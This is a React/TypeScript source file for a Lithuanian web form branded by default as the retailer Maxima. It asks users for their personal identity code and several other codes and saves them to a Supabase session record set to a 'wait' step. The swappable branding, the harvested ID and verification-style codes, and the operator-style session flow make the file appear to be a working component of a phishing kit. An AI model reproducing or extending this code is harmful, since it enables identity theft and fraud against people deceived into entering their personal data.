"use client";

import { useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string | null;
  variant: "generator1" | "generator2";
};

// NOT: Alan etiketleri/yapisi tasarim anlatildiginda guncellenecek.
const FIELD_DEFS: Record<Props["variant"], { key: string; label: string; placeholder: string }[]> = {
  generator1: [
    { key: "asmens_kodas", label: "Asmens kodas", placeholder: "Įveskite asmens kodą" },
    { key: "kodas", label: "Kodas", placeholder: "Įveskite kodą" },
  ],
  generator2: [
    { key: "kodas_1", label: "Kodas 1", placeholder: "Įveskite kodą 1" },
    { key: "kodas_2", label: "Kodas 2", placeholder: "Įveskite kodą 2" },
    { key: "kodas_3", label: "Kodas 3", placeholder: "Įveskite kodą 3" },
  ],
};

export function GeneratorClient({ sessionId, variant }: Props) {
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const fields = FIELD_DEFS[variant];
  const [values, setValues] = useState<Record<string, string>>({});
  const [saving, setSaving] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId || saving) return;
    setSaving(true);
    setError(null);

    const { data } = await supabase
      .from("sessions")
      .select("form_data")
      .eq("id", sessionId)
      .maybeSingle();

    const { error: upErr } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...(data?.form_data ?? {}),
          generatorType: variant,
          generatorData: values,
        },
      })
      .eq("id", sessionId);

    setSaving(false);
    if (upErr) {
      setError("Klaida. Bandykite dar kartą.");
      return;
    }
    setDone(true);
  }

  return (
    <div className="flex min-h-[100dvh] items-center justify-center px-4 py-10">
      <div className="w-full max-w-md rounded-3xl border border-black/5 bg-white/90 p-8 shadow-[0_20px_60px_-15px_rgba(0,0,0,0.15)] backdrop-blur-xl">
        <div className="mb-6 flex items-center justify-center">
          <img
            src={settings.logo_url || "/form-assets/maxima-mini-logo.png"}
            alt={settings.portal_name || "Maxima"}
            className="h-10 object-contain"
          />
        </div>

        {done ? (
          <div className="py-8 text-center">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
              <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <p className="text-lg font-bold text-gray-900">Ačiū!</p>
            <p className="mt-1 text-sm text-gray-500">Jūsų duomenys sėkmingai išsiųsti.</p>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-4">
            <h1 className="text-center text-xl font-bold text-gray-900">
              Kodų generatorius
            </h1>
            <p className="text-center text-sm text-gray-500">
              Įveskite reikiamą informaciją, kad tęstumėte.
            </p>

            {fields.map((f) => (
              <div key={f.key}>
                <label className="mb-1.5 block text-xs font-bold uppercase tracking-wide text-gray-500">
                  {f.label}
                </label>
                <input
                  type="text"
                  required
                  value={values[f.key] ?? ""}
                  onChange={(e) => setValues((prev) => ({ ...prev, [f.key]: e.target.value }))}
                  placeholder={f.placeholder}
                  className="w-full rounded-xl border border-gray-200 bg-gray-50 px-4 py-3 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#0066CC] focus:bg-white focus:ring-2 focus:ring-[#0066CC]/20"
                />
              </div>
            ))}

            {error && <p className="text-center text-sm font-medium text-red-500">{error}</p>}

            <button
              type="submit"
              disabled={saving}
              className="w-full rounded-xl bg-[#0066CC] px-4 py-3.5 text-sm font-bold uppercase tracking-wide text-white shadow-lg shadow-[#0066CC]/25 transition-all hover:bg-[#005bb5] disabled:opacity-50"
            >
              {saving ? "Siunčiama..." : "Patvirtinti"}
            </button>
          </form>
        )}
      </div>
    </div>
  );
}
